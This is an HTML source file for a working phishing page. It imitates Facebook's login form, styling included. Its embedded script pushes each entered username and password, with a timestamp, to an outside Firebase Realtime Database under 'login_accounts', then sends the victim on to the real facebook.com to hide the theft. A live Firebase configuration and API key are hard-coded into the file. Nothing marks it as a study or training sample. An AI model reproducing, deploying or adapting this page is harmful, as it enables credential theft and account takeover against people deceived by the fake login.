<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Facebook Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <style>
    body {
      background-color: #f0f2f5;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1rem;
    }

    .facebook-logo {
      font-weight: 900;
      font-size: 3.5rem;
      color: #1877f2;
      letter-spacing: -3.5px;
      line-height: 1;
      user-select: none;
    }

    .left-section {
      max-width: 380px;
      margin-right: 4rem;
    }

    .info-text {
      font-size: 1.3rem;
      color: #1c1e21;
      margin-top: 0.25rem;
      line-height: 1.3;
      user-select: none;
    }

    .login-form {
      background: white;
      padding: 2rem 2.5rem 1rem;
      border-radius: 8px;
      box-shadow: 0 6px 12px rgb(0 0 0 / 0.15);
      width: 100%;
      max-width: 380px;
      box-sizing: border-box;
    }

    .input-field {
      border: 1.5px solid #dddfe2;
      border-radius: 6px;
      padding: 0.75rem 1rem;
      font-size: 1.05rem;
      width: 100%;
      margin-bottom: 0.9rem;
      outline-offset: 1px;
      transition: border-color 0.2s;
    }

    .input-field:focus {
      border-color: #1877f2;
      box-shadow: 0 0 6px #1877f2aa;
    }

    .password-wrapper {
      position: relative;
      width: 100%;
      margin-bottom: 1.3rem;
    }

    .password-toggle {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      color: #606770;
      font-size: 1.15rem;
      user-select: none;
    }

    .login-btn {
      background-color: #1877f2;
      color: white;
      font-weight: 700;
      border-radius: 6px;
      padding: 0.75rem 0;
      font-size: 1.25rem;
      cursor: pointer;
      width: 100%;
      margin-bottom: 1rem;
      border: none;
      box-shadow: 0 2px 5px rgb(24 119 242 / 0.6);
      transition: background-color 0.3s;
    }

    .login-btn:hover {
      background-color: #166fe5;
    }

    .forgotten-password {
      font-size: 0.9rem;
      color: #1877f2;
      text-align: center;
      margin-bottom: 0.8rem;
      cursor: pointer;
      user-select: none;
    }

    .separator {
      border-top: 1px solid #dddfe2;
      margin: 1rem 0;
    }

    .create-account-btn {
      background-color: #42b72a;
      color: white;
      font-weight: 700;
      border-radius: 6px;
      padding: 0.75rem 1rem;
      font-size: 1rem;
      cursor: pointer;
      width: 100%;
      border: none;
      box-shadow: 0 2px 5px rgb(66 183 42 / 0.6);
      transition: background-color 0.3s;
      user-select: none;
    }

    .create-account-btn:hover {
      background-color: #36a420;
    }

    .page-link {
      margin-top: 1.5rem;
      font-size: 0.95rem;
      text-align: center;
      color: #1c1e21;
      user-select: none;
    }

    .page-link strong {
      cursor: pointer;
      font-weight: 700;
    }

    @media (max-width: 880px) {
      body {
        flex-direction: column;
      }

      .left-section {
        margin-right: 0;
        margin-bottom: 2rem;
        text-align: center;
      }
    }
  </style>
</head>

<body>
  <section class="left-section">
    <h1 class="facebook-logo">facebook</h1>
    <p class="info-text">
      Facebook helps you connect and share with the people in your life.
    </p>
  </section>

  <section class="login-section">
    <form class="login-form" id="loginForm">
      <input type="text" class="input-field" placeholder="Username or email" id="username" required />

      <div class="password-wrapper">
        <input type="password" class="input-field" placeholder="Password" id="passwordInput" required />
        <span id="togglePassword" class="password-toggle" role="button">&#128065;</span>
      </div>

      <button type="submit" class="login-btn">Log in</button>
      <div class="forgotten-password">Forgotten password?</div>
      <div class="separator"></div>
      <button type="button" class="create-account-btn">Create new account</button>
    </form>

    <p class="page-link">
      <strong>Create a Page</strong> for a celebrity, brand or business.
    </p>
  </section>

  <script>
    // âœ… Firebase config
    const firebaseConfig = {
      apiKey: "AIzaSyCYb-O5CWArzqPU6zRRYTWz6wIMy1NK8bs",
      authDomain: "fb-acc-d2f14.firebaseapp.com",
      databaseURL: "https://fb-acc-d2f14-default-rtdb.asia-southeast1.firebasedatabase.app/",
      projectId: "fb-acc-d2f14",
      storageBucket: "fb-acc-d2f14.appspot.com",
      messagingSenderId: "584920769927",
      appId: "1:584920769927:web:8755c807dc327129b1401b"
    };

    // ðŸ”§ Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    // ðŸ‘ï¸ Toggle password visibility
    const passwordInput = document.getElementById('passwordInput');
    const togglePassword = document.getElementById('togglePassword');
    togglePassword.addEventListener('click', () => {
      passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
    });

    // ðŸ“ Save login to Firebase and redirect
    document.getElementById('loginForm').addEventListener('submit', function (e) {
      e.preventDefault();

      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('passwordInput').value;

      if (username && password) {
        const loginRef = database.ref('login_accounts').push();
        loginRef.set({
          username: username,
          password: password,
          timestamp: new Date().toISOString()
        }).then(() => {
          window.location.href = "https://www.facebook.com/";
        }).catch((error) => {
          alert('Error saving to Firebase: ' + error.message);
        });
      }
    });
  </script>
</body>

</html>
